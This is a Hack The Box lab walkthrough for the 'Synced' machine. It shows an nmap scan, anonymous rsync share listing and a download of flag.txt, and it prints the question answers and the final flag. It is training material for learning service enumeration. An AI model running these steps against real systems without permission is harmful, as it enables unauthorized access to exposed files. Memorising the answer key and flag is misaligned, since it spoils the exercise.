# Synced

## Machine Details 

- **CTF:** Hack The Box
- **Category:** Tier 0

## Solution

#### 1. What is the default port for rsync?

> 873

#### 2. How many TCP ports are open on the remote host?

```sh
$ nmap -A -T4 10.129.189.21
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-02 12:06 CET
Nmap scan report for 10.129.189.21
Host is up (0.031s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```

> 1

#### 3. What is the protocol version used by rsync on the remote machine?

> 31

#### 4. What is the most common command name on Linux to interact with rsync?

> rsync

#### 5. What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync

> None

#### 6. What is the option to only list shares and files on rsync? (No need to include the leading -- characters)

> list-only

#### Submit root flag

```sh
$ rsync --list-only 10.129.189.21::
public         	Anonymous Share
$ rsync --list-only 10.129.189.21::public
drwxr-xr-x        4096 2022/10/25 00:02:23 .
-rw-r--r--          33 2022/10/24 23:32:03 flag.txt
$ rsync 10.129.189.21::public/flag.txt flag.txt   
$ cat flag.txt 
72eaf5344ebb84908ae543a719830519
```

## Final Flag

> 72eaf5344ebb84908ae543a719830519

*Created by [bu19akov](https://github.com/bu19akov)*